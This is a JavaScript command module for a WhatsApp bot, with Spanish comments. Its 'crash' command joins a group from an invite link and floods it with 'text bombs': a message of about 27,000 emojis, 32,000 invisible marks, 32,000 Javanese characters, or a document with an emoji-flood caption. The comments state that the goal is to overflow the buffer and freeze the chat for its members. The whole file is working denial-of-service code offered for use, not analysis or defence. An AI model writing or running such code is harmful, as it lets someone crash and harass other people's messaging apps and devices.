export default {
  name: ["crash"],
  description: "Bomba de emojis: traba el grupo con UN solo mensaje",
  category: 'owner',
  ownerOnly: true,

  async run({ sock, from, text, cmdName, reply }) {
    if (!text || !text.includes('whatsapp.com')) {
      return reply({ text: `😿 Pásame el enlace del grupo.\nEjemplo: .${cmdName} https://chat.whatsapp.com/XXXX [emoji|oculto|texto|doc]` });
    }

    const match = text.match(/chat\.whatsapp\.com\/([\w\d]+)/i);
    if (!match) return reply({ text: '😡 Enlace inválido.' });
    const code = match[1];
    const tipo = (text.trim().split(/\s+/)[1] || 'emoji').toLowerCase();

    let groupId;
    try {
      groupId = (await sock.groupGetInviteInfo(code)).id;
    } catch {
      return reply({ text: '⚠️ No pude leer el grupo. Enlace inválido o expirado.' });
    }

    // Por si el bot no está dentro (si ya está, esto no hace daño)
    try { await sock.groupAcceptInvite(code); } catch {}

    // BOMBA DE EMOJIS: esto es lo que de verdad desborda el búfer.
    // Mezcla de emojis distintos = más glifos que cargar, más traba.
    const SET = '😭🔥💀👻🤖💥🌟🍕🚀🎉😂😍😱🥶🤯👽🎃🧠🍀⚡🌈🐉🦖🌋🎯🥵😵‍💫🫠👾🤡🦄🍩☠️🎸🏆💎🧨🔮🪐🌙⭐🎈🥳🤩😎';
    const EMOJI = SET.repeat(600); // ~27.000 emojis en un solo mensaje

    const armas = {
      emoji:  () => sock.sendMessage(groupId, { text: EMOJI }),

      // Caracteres invisibles (el clásico "texto bomba")
      oculto: () => sock.sendMessage(groupId, { text: '\u200E'.repeat(32000) }),

      // Letras javanesas (por si quieres comparar)
      texto:  () => sock.sendMessage(groupId, { text: 'ꦾ'.repeat(32000) }),

      // Emojis como caption de documento
      doc:    () => sock.sendMessage(groupId, {
        document: Buffer.from('\u200E'.repeat(4000)),
        fileName: 'bomba.doc',
        mimetype: 'application/msword',
        caption: EMOJI,
      }),
    };

    const arma = armas[tipo] || armas.emoji;

    const t = Date.now();
    try {
      await arma();
    } catch (e) {
      return reply({ text: `❌ Falló el envío (${tipo}): ${e.message}` });
    }

    await reply({ text: `💥 Bomba *${tipo}* lanzada a ${groupId} · ${Date.now() - t} ms` });
  },
};